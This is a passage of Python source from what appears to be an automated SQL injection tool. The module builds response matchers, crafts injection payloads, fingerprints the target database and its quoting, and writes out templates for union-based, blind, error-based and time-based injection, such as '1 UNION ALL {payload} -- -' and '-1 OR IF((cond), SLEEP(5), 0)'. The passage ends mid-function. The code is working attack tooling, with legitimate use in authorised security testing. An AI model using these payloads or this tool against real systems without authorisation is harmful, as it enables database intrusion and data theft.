"""This module contains the logic to automatically configure an injection.

It includes: producing a matcher that can distinguish outcomes, detecting the syntax of
the injection, finding the target DBMS, and injection methods.
"""

from __future__ import annotations

import asyncio
import dataclasses
import functools
import importlib
import inspect
import itertools
import random
import re
from abc import ABC, abstractmethod
from dataclasses import KW_ONLY, dataclass, field
from difflib import SequenceMatcher
from logging import Logger
from pkgutil import iter_modules
from types import ModuleType
from typing import Any, Awaitable, Callable, Literal

from ending import db
from ending.ast import (
    Alias,
    Concatenation,
    Identifier,
    Length,
    Node,
    Query,
    Union,
    Value,
)
from ending.cli.design import Design, DesignEditor
from ending.db.generic.compiler import Compiler
from ending.db.generic.method import HexDisplayMethod, Method
from ending.exception import InjectionError
from ending.struct.livestatus import LiveStatus, VoidLiveStatus
from ending.util import logging, randomized
from ending.util.logging import logger
from ending.util.typing import QuoteCallable


class RNG:
    """Returns a random number between 11111, 22222, 33333, ..., 99999.
    The numbers are returned in a cycle as it is very important that consequent calls
    don't return the same value, but we do not care so much about real randomness.
    """

    def __init__(self):
        numbers = [11111 * i for i in range(1, 10)]
        random.shuffle(numbers)
        self.rng = itertools.cycle(numbers)

    def __call__(self) -> int:
        return next(self.rng)

    def tautology(self) -> str:
        value = self()
        return f"{value}={value}"

    def contradiction(self) -> str:
        return f"{self()}={self()}"


RNG = RNG()


class Hole:
    def __repr__(self) -> str:
        return "<HOLE>"

    def __eq__(self, other: object) -> bool:
        return isinstance(other, Hole)

    def __hash__(self) -> int:
        return id(self)


class NoChainException(Exception):
    """Chains cannot be built from samples."""


class ConfigurationException(Exception):
    """Unable to automatically configure the injection."""


Link = Hole | bytes
Links = tuple[Link, ...]


@dataclass
class Chain:
    """A sequence of bytes and holes. A hole is a placeholder for a space in the
    pattern that is not always the same.

    Chains can be merged together, and can be converted into a regex pattern.
    In addition, they can be simplified by removing parts that are not necessary to
    exclude given samples.

    For instance, merging `Chain([A, X, B], True, True)` and
    `Chain([A, Y, B], True, True)` would produce `Chain([A, Hole(), B], True, True)`.
    If we exclude sample `[A, Z]`, we'd get `Chain([B], False, True)`.
    """

    links: Links

    def length(self) -> int:
        return sum(len(link) for link in self.links if not isinstance(link, Hole))

    def to_pattern(self) -> re.Pattern[bytes]:
        """Converts the chain into a regex pattern. Use `search()` to check if it
        matches, not `match()`.

        The operation is costly, and shouldn't be used too many times.
        """
        if not self.links:
            return re.compile(b"^$", flags=re.DOTALL)

        start = 0
        stop = len(self.links)

        if isinstance(self.links[0], Hole):
            prefix = b""
            start = 1
        else:
            prefix = b"^"
            start = 0

        if isinstance(self.links[-1], Hole):
            suffix = b""
            stop = -1
        else:
            suffix = b"$"
            stop = len(self.links)

        links = self.links[start:stop]
        pattern = b"".join(
            b".*" if isinstance(element, Hole) else re.escape(element)
            for element in links
        )
        pattern = prefix + pattern + suffix
        return re.compile(pattern, flags=re.DOTALL)

    @classmethod
    def merge(cls, a: Chain, b: Chain) -> Chain:
        """Merges two chains into one. Parts that are different are replaced by a hole."""
        if a.links == b.links:
            return a

        matcher = SequenceMatcher(None, a.links, b.links)
        blocks = matcher.get_matching_blocks()

        # The last block is a dummy (see doc), discard it
        blocks.pop()

        if not blocks:
            raise NoChainException("No matching blocks")

        def reduce_fragments(a: Links, b: Links) -> Links:
            return a + (Hole(),) + b

        # Extract the fragments that match
        fragments: list[Links] = [
            a.links[block.a : block.a + block.size] for block in blocks
        ]
        links: Links = functools.reduce(reduce_fragments, fragments)

        # If the first match is at the beginning of the sequence, and each sequence is
        # strict start, we're still strict start
        start = blocks[0]
        start = start.a == start.b == 0
        if not start:
            links = (Hole(),) + links

        # If the last match is at the end of the sequence, and each sequence is strict
        # end, we're still strict end
        stop = blocks[-1]
        stop = stop.a + stop.size == len(a.links) and stop.b + stop.size == len(b.links)
        if not stop:
            links = links + (Hole(),)

        return Chain(tuple(links))

    @classmethod
    def from_samples(cls, samples: list[bytes], convertor=None) -> Chain:
        """Builds a chain from a list of samples."""

        if convertor:
            convertors = (convertor,)
        else:
            convertors = (
                cls.by_html_tags,
                cls.by_punctuation,
                cls.by_punctuation_and_spaces,
                cls.by_bytes,
            )

        for convertor in convertors:
            try:
                chain = functools.reduce(cls.merge, map(convertor, samples))
            except NoChainException:
                continue
            else:
                return chain

        raise NoChainException("Unable to build chain from samples")

    def split(self) -> tuple[Chain, Chain, bool]:
        """Splits the chain in two parts. If the chain cannot be split, raises
        NoChainException.
        """

        match self.links:
            case (Hole(), _, Hole()) | (_, Hole()) | (Hole(), _) | [] | [_]:
                raise NoChainException("Cannot split chain in two")
            case (Hole(), _, _):
                middle = 2
            case (_, _, Hole()):
                middle = 1
            case _:
                middle = len(self.links) // 2

        left = self.links[:middle]
        right = self.links[middle:]

        if not isinstance(left[-1], Hole):
            left = left + (Hole(),)
        if not isinstance(right[0], Hole):
            right = (Hole(),) + right

        return (
            Chain(left),
            Chain(right),
        )

    def excludes(self, *samples: bytes) -> bool:
        """Returns true if the chain matches none of the given samples."""
        return not self.matches(*samples)

    def matches(self, *samples: bytes) -> bool:
        """Returns true if the chain matches at least one of the given samples."""
        return any(self._matches(sample) for sample in samples)

    def _matches(self, sample: bytes) -> bool:
        """Returns true if the chain matches the given sample."""
        #: position in the sample (in bytes)
        p_sample = 0
        #: position in the list of links (index)
        p_links = 0
        links = self.links

        if len(links) == 0 and sample:
            return False

        # The algorithm takes chunks of the chain and tries to find them in the sample,
        # in order. If it cannot find a chunk, it means the chain does not match.
        # Special care is taken for the first and last chunk, as they have to be at the
        # beginning and end of the sample, respectively.

        try:
            while p_links < len(links):
                p_hole = links.index(Hole(), p_links)
                merged = b"".join(links[p_links:p_hole])
                # Special case: the first chunk is not preceeded by a hole, meaning that
                # the sample must start with it
                if p_links == 0:
                    if not sample.startswith(merged):
                        return False
                    p_sample += len(merged)
                else:
                    try:
                        p_sample = sample.index(merged, p_sample) + len(merged)
                    except ValueError:
                        return False
                p_links = p_hole + 1
        # No other hole was found: this means that the last chunk must be at the end of
        # the sample
        except ValueError:
            merged = b"".join(links[p_links:])
            if p_links == 0:
                if sample != merged:
                    return False
            if not sample.endswith(merged, p_sample):
                return False
        return True

    def simplify(self, samples: list[bytes], length: int = 1) -> Chain:
        """Simplifies the chain by removing parts that are not necessary to exclude
        given samples.

        The resulting chain will match every original sample, but NOT the ones given
        here.

        If no such chain can be found, an exception is raised.
        """
        # Get rid of duplicates
        samples = set(samples)

        # If the chain matches given samples, we're doomed
        if self.matches(*samples):
            raise NoChainException("Chain matches on other samples")

        #: What's a valid size for a chain? the size of a chain is its number of links,
        #: excluding holes
        acceptable_length = length
        #: Lists list of chains (or really, lists of links) that do not match given
        # samples and as such constitute valid chains
        valid_chains: list[Chain] = [self]
        #: Smallest found chain
        result: Chain = self

        def keep_if_valid(chain: Chain) -> bool:
            if not chain.matches(*samples):
                valid_chains.append(chain)

        # Each chain in this list does not match any of the samples; we split it by
        # two and check if any of its left and right side doesn't either
        while valid_chains:
            current = valid_chains.pop()
            length = current.length()
            if length < result.length():
                if length <= acceptable_length:
                    return current
                result = current

            try:
                left, right = current.split()
            except NoChainException:
                continue

            keep_if_valid(left)
            keep_if_valid(right)

        return result

    @classmethod
    def by_bytes(cls, sample: bytes) -> Chain:
        """Converts a sample into a chain made of single bytes."""
        return cls(tuple(sample[i : i + 1] for i in range(len(sample))))

    @classmethod
    def by_punctuation_and_spaces(cls, sample: bytes) -> Chain:
        """Converts a sample into a chain made of blocks of a few bytes, split by
        punctuation.
        """
        return cls._by_split(rb"([^\w\s])", sample)

    @classmethod
    def by_punctuation(cls, sample: bytes) -> Chain:
        """Converts a sample into a chain made of blocks of a few bytes, split by
        punctuation.
        """
        return cls._by_split(rb"([^\w])", sample)

    @classmethod
    def by_html_tags(cls, sample: bytes) -> Chain:
        """Converts a sample into a chain made of blocks of a few bytes, split by
        html tags.
        """
        return cls._by_split(rb"(<[^>]+>)", sample)

    @classmethod
    def _by_split(cls, regex: bytes, sample: bytes) -> list[bytes]:
        return cls(tuple(v for v in re.split(regex, sample) if v))

    @staticmethod
    def build(a_samples: list[bytes], b_samples: list[bytes]) -> Chain | None:
        convertors = (
            Chain.by_html_tags,
            Chain.by_punctuation,
            Chain.by_punctuation_and_spaces,
            Chain.by_bytes,
        )
        for convertor in convertors:
            try:
                chain = Chain.from_samples(a_samples, convertor=convertor)
                if not chain.excludes(*b_samples):
                    continue
            except NoChainException:
                continue
            return chain
        return None


@dataclass
class Matcher(ABC):
    """Verifies that a pattern matches (or not) a sample."""

    @abstractmethod
    def matches(self, sample: bytes) -> bool:
        """Returns whether the given sample matches."""

    @abstractmethod
    def negate(self) -> Matcher:
        """Returns another matcher that returns false if the pattern matches and
        vice-versa."""

    @abstractmethod
    def is_positive(self) -> bool:
        """Returns true if the matcher checks that something is present, or false if it
        check that something is absent.
        """


@dataclass
class ChainMatcher(Matcher):
    """Base matcher that uses a chain to check if samples match."""

    chain: Chain


class PositiveMatcher(ChainMatcher):
    """A matcher that verifies that the chain matches."""

    def matches(self, sample: bytes) -> bool:
        return self.chain.matches(sample)

    def negate(self) -> Matcher:
        return NegativeMatcher(self.chain)

    def is_positive(self) -> bool:
        return True


class NegativeMatcher(ChainMatcher):
    """A matcher that verifies that the chain does not match."""

    def matches(self, sample: bytes) -> bool:
        return not self.chain.matches(sample)

    def negate(self) -> Matcher:
        return PositiveMatcher(self.chain)

    def is_positive(self) -> bool:
        return False


@dataclass
class StabilizedMatcher(Matcher):
    """A matcher that is stabilized, i.e. that does not change when more samples are
    added.
    The matcher is built by building a chain that matches the samples of `sampler_from`
    but not the ones in `sampler_to`, and continuing to incorporate samples until the
    chain does not change anymore.
    """

    matcher: ChainMatcher
    sampler_from: Sampler
    sampler_to: Sampler

    MIN_SAMPLES = 3
    """Minimum samples to use to build a stabilized matcher."""
    MAX_SAMPLES = 10
    """Maximum samples to use to build a stabilized matcher."""
    REPETITIONS = 3
    """Number of times the matcher must be identical to be considered stabilized."""

    @classmethod
    async def build(
        cls,
        sampler_from: Sampler,
        sampler_to: Sampler,
        parent: StabilizedMatcher = None,
        allow_negative: bool = True,
    ) -> StabilizedMatcher | None:
        """Tries to build a `StabilizedMatcher` from the given samplers. If it fails to
        do so, returns `None`. For a matcher to be considered stabilized, it needs to be
        identical `StabilizedMatcher.REPETITIONS` times in a row.
        """
        nb_repetitions = 1

        match parent:
            case None:
                previous_from_samples = []
                previous_to_samples = []
                old_matcher = None
            case _:
                previous_from_samples = parent.sampler_from.samples
                previous_to_samples = parent.sampler_to.samples
                old_matcher = parent.matcher

        for nb in range(cls.MIN_SAMPLES - 1, cls.MAX_SAMPLES):
            matcher = await cls._build_chain_matcher(
                previous_from_samples,
                previous_to_samples,
                sampler_from,
                sampler_to,
                nb,
                allow_negative,
            )

            # Unable to find a matcher: abort
            if matcher is None:
                break

            # The matcher is the same: increment the counter

            if matcher == old_matcher:
                nb_repetitions += 1
                # We have found a stabilized matcher!
                if nb_repetitions == cls.REPETITIONS:
                    return cls(matcher, sampler_from, sampler_to)
                continue

            nb_repetitions = 1

            # Otherwise, keep going
            old_matcher = matcher

        return None

    @classmethod
    async def _build_chain_matcher(
        cls,
        previous_from_samples: list[bytes],
        previous_to_samples: list[bytes],
        sampler_from: Sampler,
        sampler_to: Sampler,
        nb: int,
        allow_negative: bool,
    ) -> ChainMatcher | None:
        """Builds a `ChainMatcher` for the given from->to way. Returns `None` if no such
        matcher can be built with `StabilizedMatchersBuilder.MAX_SAMPLES` samples.
        """
        samples_from, samples_to = await asyncio.gather(
            sampler_from.get(nb), sampler_to.get(nb)
        )
        samples_from = previous_from_samples + samples_from
        samples_to = previous_to_samples + samples_to

        if chain := Chain.build(samples_from, samples_to):
            return PositiveMatcher(chain)

        if not allow_negative:
            return None

        if chain := Chain.build(samples_to, samples_from):
            return NegativeMatcher(chain)

        return None

    def matches(self, sample: bytes) -> bool:
        return self.matcher.matches(sample)

    def negate(self) -> StabilizedMatcher:
        return StabilizedMatcher(
            self.matcher.negate(), self.sampler_to, self.sampler_from
        )

    def is_positive(self) -> bool:
        return self.matcher.is_positive()

    def to_pattern(self) -> re.Pattern[bytes]:
        """Returns a regex pattern that matches the from samples, but not the to
        samples. The pattern is made short, if possible.
        """
        samples = (
            self.is_positive() and self.sampler_to.samples or self.sampler_from.samples
        )
        return self.matcher.chain.simplify(samples).to_pattern()


OutcomeType = Literal["success", "failure", "error"]
MatcherType = tuple[OutcomeType, OutcomeType]
MatcherMap = dict[MatcherType, Matcher]
StabilizedMatcherMap = dict[MatcherType, StabilizedMatcher]
InjectCallable = Callable[[str], Awaitable[bytes]]


@dataclass
class Injector(ABC):
    """An injector is a callable that sends an SQL condition to the server and returns
    the contents of the response.
    The SQL expression is formatted so that it can be properly interpreted by the
    server.
    """

    send: Callable[[str], Awaitable[bytes]]
    """Sends a payload and returns the bytes of the response."""
    value: Any
    """The default value of the injected parameter, extracted from `Injector.send`."""
    _: KW_ONLY
    force_failure: bool = False
    """Whether the payload should always produce a failure outcome."""

    @abstractmethod
    def build_payload(
        self, condition: str = None, suffix: str = None, operator: str = "AND"
    ) -> str:
        """Creates an injection payload containing the condition and, if given, the
        suffix. Both are optional. By default, the `operator` linking the original
        condition and the additional one (`condition`) is `AND`. `OR` can be used
        instead, but `condition` should be garantied to return `False`, or we are in
        dangerous territory.
        """

    async def __call__(
        self, condition: str = None, suffix: str = None, operator: str = "AND"
    ) -> bytes:
        """Sends an SQL test to the server and returns the response."""
        payload = self.build_payload(condition, suffix=suffix)
        return await self.send(payload)

    def allow_condition(self) -> Injector:
        """Returns a new Injector where the injected condition controls the outcome."""
        return dataclasses.replace(self, force_failure=False)

    def enforce_failure(self) -> Injector:
        """Returns a new Injector that forces the injected condition to always fail."""
        return dataclasses.replace(self, force_failure=True)


@dataclass
class FormatInjector(Injector):
    """Injects SQL expressions in-place, without trying to make it fit the syntax of
    the query. Works for queries such like:

    - SELECT {} FROM users
    - SELECT * FROM users WHERE id={}
    """

    formatter: str

    def build_payload(
        self, condition: str = None, suffix: str = None, operator: str = "AND"
    ) -> str:
        if self.force_failure:
            if condition is not None:
                condition = f"{condition} {operator} {RNG.contradiction()}"
            else:
                condition = RNG.contradiction()
        elif condition is None:
            condition = RNG.tautology()

        return self.formatter.format(value=self.value, condition=condition) + (
            suffix or ""
        )


@dataclass
class ConditionInjector(Injector):
    """Injects SQL expressions into a condition, in queries such as:

    - SELECT * FROM users WHERE id={}
    - SELECT * FROM news WHERE id IN ('test', 'test2', '{}')
    - SELECT * FROM news WHERE (title LIKE '%{}%') AND (date > {})
    - SELECT * FROM news WHERE (title LIKE '%{}%') AND (date > ...)
    """

    nb_parentheses: int
    """Number of parentheses to add between our injected condition and the prefix/suffix
    """
    quote: str
    """Type of quote to use: None, single, double."""
    risky: bool
    """Whether we can make the injected condition return more results than the original
    one. Set this flag if there is no risk of modifying/deleting data, i.e. if you are
    in a SELECT statement.
    """

    def build_payload(
        self, condition: str = None, suffix: str = None, operator: str = "AND"
    ) -> str:
        """Args:

            condition: Condition to inject
            suffix: Optional suffix to append after the condition (e.g. an SQL
            comment)
            operator: Operator to prepend the condition with. Either `AND` or `OR`.

        Returns:

            Payload to inject.
        """
        # We are injecting in an SQL condition.
        # We want to maximize number of cases where our condition controls the outcome
        # of the query. We can represent any (parenthese-less) form imagining we are in
        # the middle or composite condition of the form:
        #
        #   {bool} {operator} {injection} {operator} {bool}
        #
        # Such as:
        #
        # - true AND {injection} OR true
        # - true OR {injection} OR false
        # - true AND {injection} OR false
        #
        # Note: this syntax can be used to represent any case, even the simpler ones.
        # For instance, `WHERE {injection}` is equivalent to `WHERE 1 AND {injection}
        # AND 1`.
        #
        # When in risky mode, the best way to control the outcome is to make other
        # conditions irrelevant by making them always false, and use `OR` to let the
        # injection decide the outcome. This tackles 9/16 cases successfully, which is
        # already pretty good as some cases cannot be controlled (`true OR {injection}`
        # for instance does not give us any leverage. The best payload is:
        #
        #   false OR {condition} OR false
        #
        # When NOT in risky mode however, it gets harder, as we cannot make the
        # injection return more results that expected normally. As a result, more cases
        # cannot be won, like `false AND {injection} ...` for instance. The best payload
        # is:
        #
        #   true AND {condition} AND true
        #
        # Which wins 25% of the time.
        #
        # TODO Consider the role of parentheses
        #

        popen = "(" * self.nb_parentheses
        pclose = ")" * self.nb_parentheses
        quote = self.quote
        value = "1" if self.value == "" and self.quote == "" else self.value

        # Get it?
        operend = f"{value}{quote}{pclose}"

        # false OR {condition[ AND {outcome}]OR false
        if self.risky:
            # LEFT
            # We use AND {contradiction} to ensure that the OR that comes right after is
            # evaluated
            left = f"{operend} AND {RNG.contradiction()}"

            # MIDDLE
            # Make sure we get no results if self.force_failure is true

            middle = []

            if condition:
                middle.append(condition)
            if self.force_failure:
                middle.append(RNG.contradiction())

            if middle:
                middle = " OR " + " AND ".join(middle)
            else:
                middle = ""

            # RIGHT

            if suffix is not None:
                right = suffix
            else:
                right = f" OR {popen}{quote}{RNG()}{quote}={quote}{RNG()}"

            # ASSEMBLE

            payload = f"{left}{middle}{right}"

        # true AND {condition} AND {outcome}
        else:
            left = operend

            if condition:
                middle = f" AND {condition}"
            else:
                middle = ""

            if suffix is not None:
                if self.force_failure:
                    right = f" AND {RNG.contradiction()}{suffix}"
                else:
                    right = suffix
            else:
                comparator = self.force_failure and "=" or "!="
                right = f" AND {popen}{quote}{RNG()}{quote}{comparator}{quote}{RNG()}"

            payload = f"{left}{middle}{right}"

        return payload


@dataclass
class ErrorOracle(ABC):
    """Base interface for syntax-check oracles used during configuration.

    An `ErrorOracle` validates whether a candidate SQL condition is accepted by the
    target database engine by observing whether it produces an error or not. It is used
    during DBMS fingerprinting and quoting detection when the configuration process must
    verify SQL syntax without causing side effects.

    It does not matter if the condition produces a successful or a failed outcome, as
    long as it does not produce an error. As a result, the `test` method does not need
    to be aware of the expected outcome of the condition, and only checks whether it is
    accepted by the server or not.
    """

    injector: Injector
    matcher: Matcher

    @abstractmethod
    async def test(self, condition: str = None, suffix: str = None) -> bool:
        """Returns true if the given SQL condition does not produce an SQL error, i.e.
        has valid syntax.

        The given `test` must be a valid SQL expression, that always returns *true* for
        the target DBMS.
        """

    @staticmethod
    def build(injector: Injector, matchers: MatcherMap) -> ErrorOracle:
        """Builds an `ErrorOracle` from the given `injector` and `matchers`. The best
        possible matchers are used to minimize the number of requests needed to validate
        SQL syntax.
        """
        (outcome_from, outcome_to), matcher = get_best_matcher(matchers, "error")

        # Best case: we got an error-based matcher
        if outcome_to == "error":
            if outcome_from == "success":
                specialized = injector.allow_condition()
            else:
                specialized = injector.enforce_failure()
            return SingleTestErrorOracle(specialized, matcher)
        # Worst case: we need two requests per tests, as our DBMS and quote detection
        # abilities are error-based
        else:
            return DoubleTestErrorOracle(injector, matcher)


@dataclass
class SingleTestErrorOracle(ErrorOracle):
    """Oracle implementation that validates SQL syntax with a single request."""

    async def test(self, condition: str = None, suffix: str = None) -> bool:
        """Checks that the syntax of `test` is valid by sending the payload and
        verifying that it matches.
        """
        response = await self.injector(condition, suffix)
        return self.matcher.matches(response)


@dataclass
class DoubleTestErrorOracle(ErrorOracle):
    """Oracle implementation that validates SQL syntax with two requests.

    This implementation is used when the only matcher we have is a success/failure
    matcher, which means that we can only check whether a condition is accepted or
    rejected by the server, but not whether it produces an error or not. To bypass this
    issue, we send the payload normally and then reversed.
    """

    def __post_init__(self):
        self._oracle_success = SingleTestErrorOracle(
            self.injector.allow_condition(), self.matcher
        )
        self._oracle_failure = SingleTestErrorOracle(
            self.injector.enforce_failure(), self.matcher.negate()
        )

    async def test(self, condition: str = None, suffix: str = None) -> bool:
        """Checks that the syntax of `test` is valid by sending the payload twice; once
        with a tautology, and once with a contradiction.
        The matchers must match on the first and not on the second.
        """
        response_success, response_failure = await asyncio.gather(
            self._oracle_success.test(condition, suffix),
            self._oracle_failure.test(condition, suffix),
        )
        return response_success and not response_failure


def format_matchers(matchers: MatcherMap) -> str:
    """Returns a human readable list of directions for which `matchers` has a matcher."""
    return ", ".join(
        f"{a}->{b}" for (a, b), matcher in matchers.items() if matcher is not None
    )


class ConfiguratorEmptyValue:
    """Represents an empty value."""

    pass


class Configurator(ABC):
    """A class that configures part of a `Design`."""

    design: Design
    """Design instance."""
    editor: DesignEditor
    """Design editor."""
    status: LiveStatus
    """A live status instance."""
    logger: Logger
    """A logger instance."""
    base_value: Any
    """Base value of the `send()` method."""

    SPECIAL_VALUE = "a\"b'c\nd\\e<f"
    """A value that is likely to be modified by filters or escape functions."""

    def __init__(self, design: Design, *, status: LiveStatus = None) -> None:
        self.design = design
        self.editor = DesignEditor(design)
        self.logger = logger(type(self).__qualname__)
        self.status = status or VoidLiveStatus()

    async def configure(self) -> None:
        """Configures the design. In case the configuration fails,
        `ConfigurationException` gets raised.
        """

        try:
            return await self._configure()
        except ConfigurationException as exception:
            self.logger.error(str(exception))
            self.status.failure(str(exception))
            raise
        finally:
            self.status.done()

    @abstractmethod
    async def _configure(self) -> None:
        """Configures the design. In case the configuration fails,
        `ConfigurationException` gets raised.
        """

    def create_import_for_dbms(self, dbms: str) -> None:
        """Adds or replaces the from ending.db.{dbms} import * statement."""
        self.editor.replace_or_add_import_from_star("ending.db.", f"ending.db.{dbms}")


# TODO: Get rid of "builder" and make it a "real" object
class StabilizedMatchersBuilder(ABC):
    """Base class that generates several stabilized matchers from common samples."""

    samplers: dict[OutcomeType, Sampler]
    """Samplers for each outcome type.
    """
    parent: StabilizedMatchersBuilder
    """Parent builder. If a stabilized matcher has a parent, its samples will be taken,
    and the matcher will be built from the parent's matcher.
    """
    matchers: StabilizedMatcherMap
    """Stabilized matchers that have already been built. The matcher is garantied to be
    a `PositiveMatcher`.
    """

    DIRECTIONS = [
        ("success", "failure", True),
        ("success", "error", True),
        ("failure", "error", True),
    ]
    """Directions in which to build stabilized matchers. Each direction is a triple of
    from->to, and whether a `NegativeMatcher` is allowed.
    """

    def __init__(self, parent: StabilizedMatchersBuilder = None) -> None:
        self.parent = parent
        self.samplers = {
            "success": Sampler(self.generate_success),
            "failure": Sampler(self.generate_failure),
            "error": Sampler(self.generate_error),
        }
        self.matchers = {}

    def has_direction(
        self, ofrom: OutcomeType, oto: OutcomeType, allow_negative: bool
    ) -> bool:
        """Returns true if the builder tries to build a stabilized matcher in the given
        direction.
        """
        if (ofrom, oto, False) in self.DIRECTIONS:
            return True
        if allow_negative and (oto, ofrom, True) in self.DIRECTIONS:
            return True

        return False

    @abstractmethod
    async def generate_success(self, i: int) -> bytes:
        """Returns a success sample."""

    @abstractmethod
    async def generate_failure(self, i: int) -> bytes:
        """Returns a failure sample."""

    @abstractmethod
    async def generate_error(self, i: int) -> bytes:
        """Returns an error sample."""

    async def build(self) -> StabilizedMatcherMap:
        """Builds every stabilized matcher described by
        `StabilizedMatchersBuilder.DIRECTIONS` and returns their Matcher.
        """
        matchers = await asyncio.gather(
            *(
                self.get(ofrom, oto, allow_negative=allow_negative)
                for (ofrom, oto, allow_negative) in self.DIRECTIONS
            )
        )
        return {
            (ofrom, oto): matcher
            for (ofrom, oto, _), matcher in zip(self.DIRECTIONS, matchers)
        }

    async def get(
        self, ofrom: OutcomeType, oto: OutcomeType, allow_negative: bool = True
    ) -> StabilizedMatcher | None:
        """Gets a stabilized matcher for the `ofrom`->`oto` direction. If the matcher
        does not exist yet, it is generated.
        """
        # Get it from the cache, if possible

        try:
            return self.matchers[ofrom, oto]
        except KeyError:
            pass

        # TODO Double miss possible, inefficient
        if allow_negative:
            try:
                return self.matchers[oto, ofrom].negate()
            except KeyError:
                pass

        # No cache: we have to build it

        # First, check the parent, but only if it tried to get a matcher in the same
        # direction
        if self.parent and self.parent.has_direction(
            ofrom, oto, allow_negative=allow_negative
        ):
            parent = await self.parent.get(ofrom, oto, allow_negative=allow_negative)
            # If the parent matcher is None, no point doing any more work
            if parent is None:
                return None
        else:
            parent = None
        stabilized_matcher = await StabilizedMatcher.build(
            self.samplers[ofrom],
            self.samplers[oto],
            allow_negative=allow_negative,
            parent=parent,
        )

        # Store in the cache

        if stabilized_matcher is None:
            self.matchers[ofrom, oto] = None
        elif not allow_negative or stabilized_matcher.is_positive():
            self.matchers[ofrom, oto] = stabilized_matcher
        else:
            self.matchers[oto, ofrom] = stabilized_matcher.negate()

        return stabilized_matcher


@dataclass
class Sampler:
    """Provides samples for a given outcome. Samples are generated by calling the given
    generator.
    """

    generator: Callable[[int], Awaitable[bytes]]
    samples: list[bytes] = field(default_factory=list, init=False)

    async def get(self, nb: int) -> list[bytes]:
        """Returns `nb` samples."""
        # TODO make async ?
        for i in range(len(self.samples), nb):
            sample = await self.generator(i)
            self.samples.append(sample)
        return self.samples[:nb]


class DesignConfigurator(Configurator):
    """Configures the the injector, the DBMS, and the injection method."""

    dbms_modules: list[ModuleType]

    def __init__(
        self, design: Design, risky: bool, *, status: LiveStatus = None
    ) -> None:
        super().__init__(design, status=status)
        self.risky = risky

    async def _send(self, payload: str) -> bytes:
        """Sends a payload to the server and returns the response."""
        self.logger.sql(payload)
        return await self.design.send(payload)

    def _extract_value(self) -> type[ConfiguratorEmptyValue] | Any:
        """Extracts the value from the signature of the `send()` method."""
        signature = inspect.signature(self.design.send)

        try:
            parameter = next(iter(signature.parameters.values()))
        except StopIteration:
            raise ConfigurationException("`send()` must have at least one parameter")

        match parameter.default:
            case inspect.Parameter.empty:
                return ConfiguratorEmptyValue
            case value:
                return value

    async def setup_manual(self, dbms: str = None, method: str = None) -> None:
        """Creates a skeleton for the design to be manually configured."""
        self.editor.replace_or_add_import_from_star("ending.db.", f"ending.db.{dbms}")
        self.editor.set_method(
            "set_compiler",
            f'''
async def set_compiler(self) -> Compiler:
    """Defines the compiler to use to convert AST into SQL."""
    # TODO Change the quoting function as required
    return Compiler(quote=quoting.singlequote_backslash)
''',
            after="send",
        )
        self.editor.set_method(
            "set_mapper",
            f"""
async def set_mapper(self) -> Compiler:
    return Mapper(self.method)
""",
            after="set_method",
        )

        if method and method == "blind":
            method = "testbased"

        method_code = {
            "header": """
###
### INJECTION METHOD
###
### TODO Following are templates for each common type of SQL injection method.
### Keep one and update it as necessary.
###
""",
            "testbased": """
###
### BLIND SQL INJECTION
###
### inject() returns a boolean indicating whether the condition was successful
### or not
###

async def set_method(self) -> Compiler:
    return TestMethod(self.compiler, self.inject)
    
async def inject(self, payload: Node) -> bool:
    payload = f"1 AND {payload:p}"
    response = await self.send(payload)
    return b"pattern" in response.content
    """,
            "unionbased": """
###
### UNION-BASED SQL INJECTION
###
### inject() returns the contents of the response
###

async def set_method(self) -> Compiler:
    return SelectMethod(
        self.compiler,
        self.inject,
        columns=..., # Number of columns in the select statement
        column=..., # Index of the column that is displayed in the page
        nb_rows=1000, # Maximum number of rows to dump at once
    )
    
async def inject(self, payload: Node) -> bytes:
    payload = f"1 UNION ALL {payload} -- -"
    response = await self.send(payload)
    return response.content
    """,
            "errorbased": """
###
### ERROR-BASED SQL INJECTION
###
### inject() returns the contents of the response
###

async def set_method(self) -> Compiler:
    return SomeErrorBasedMethod( # Set a proper method here
        self.compiler,
        self.inject
    )

async def inject(self, payload: Node) -> bytes:
    payload = f"1 AND {payload}"
    response = await self.send(payload)
    return response.content
    """,
            "timebased": """
###
### TIMEBASED SQL INJECTION
###
### inject() returns nothing, but the time it takes to execute the query is
### used to infer the result
###

async def set_method(self) -> Compiler:
    return TimebasedTestMethod(
        self.compiler,
        self.inject,
        delay=..., # Minimum delay induced by SQL statements that evaluate to true
    )

async def inject(self, condition: Node) -> None:
    # TODO The payload must induce a delay if the condition is true
    payload = f"-1 OR IF(({condition}), SLEEP(5), 0)"
    response = await self.send(payload)
    return None
    """,
        }

        code = method_code.values() if not method else [method_code[method]]

        self.editor.strip_triple_comments()
        self.editor.delete_all_methods("set_method", "inject")
        self.editor.set_method(
            "inject",
            "\n\n".join(map(str.strip, code)),
            after="set_mapper",
        )

    async def configure(self) -> None:
        self._load_dbms_modules()

        await self.design.setup()

        try:
            await super().configure()
        finally:
            await self.design.teardown()

    async def _configure(self) -> None:
        if not self.design.is_configurable():
            raise ConfigurationException("Design is not configurable")

        self.base_value = self._extract_value()

        self.status.status("Configuring injection")
        self.status.section("Injection", "Detecting injection logic")

        injector, matchers = await self.get_injector_and_matchers()
        nb_matchers = sum(int(matcher is not None) for matcher in matchers.values())
        self.status.success(f"Successfully injected, got **{nb_matchers}/3** matchers")

        self.status.section("DBMS", "Fingerprinting DBMS")

        oracle = ErrorOracle.build(injector, matchers)
        dbms = await self.fingerprint_dbms(oracle)

        self.status.success(f"DBMS: **{dbms.Features.name}**")
        quoter = await self.determine_quoting(oracle, dbms)
        quoted_example = quoter("ABC")

        self.status.success(
            f"Quoting method: **{quoter.__name__}** [`{quoted_example}`]"
        )

        self.setup_dbms(dbms, quoter)

        await self.configure_methods(dbms, quoter, injector, matchers)

    async def configure_methods(
        self,
        dbms: ModuleType,
        quoter: QuoteCallable,
        injector: Injector,
        matchers: StabilizedMatcherMap,
    ) -> None:
        """Configures the injection method by trying each method of the `dbms` module
        one by one until one works. The order of the methods is defined by the `__all__`
        attribute of the aforementioned module. Generally, methods are ordered by their
        efficiency: UNION (`SelectMethod`) comes first, and BLIND (`TestMethod`) comes
        last.
        """
        # Methods are listed in dbms.api.__all__ for each DBMS. The order matters, as
        # the first one that can be configured is used.
        # This is not ideal but avoids having to have an extra configuration list
        available_methods = [getattr(dbms, method) for method in dbms.api.__all__]
        available_methods = [
            SomeMethod
            for SomeMethod in available_methods
            if issubclass(SomeMethod, Method)
            and not inspect.isabstract(SomeMethod)
            and SomeMethod.get_configurator()
        ]
        self.logger.info(
            "Trying to configure one out of the %d injection methods",
            len(available_methods),
        )
        for SomeMethod in available_methods:
